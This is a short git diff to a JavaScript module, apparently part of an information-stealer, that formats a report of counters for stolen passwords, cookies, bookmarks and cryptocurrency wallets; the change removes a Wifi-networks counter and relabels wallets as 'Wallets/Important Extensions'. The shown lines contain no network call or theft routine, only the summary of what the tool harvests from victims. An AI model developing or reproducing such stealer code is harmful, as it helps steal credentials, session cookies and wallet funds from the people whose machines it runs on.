@@ -180,8 +180,7 @@ module.exports = (client) => {
                     "🔑 Passwords": client.config.counter.passwords,
                     "🍪 Cookies": client.config.counter.cookies,
                     "🔖 Bookmarks": client.config.counter.bookmarks,
-                    "💰 Wallets": client.config.counter.wallets,
-                    "📶 Wifi networks": client.config.counter.wifinetworks,
+                    "🌐 Wallets/Important Extensions": client.config.counter.wallets,
                 })) {
                 obj["fields"].push({
                     name: key,
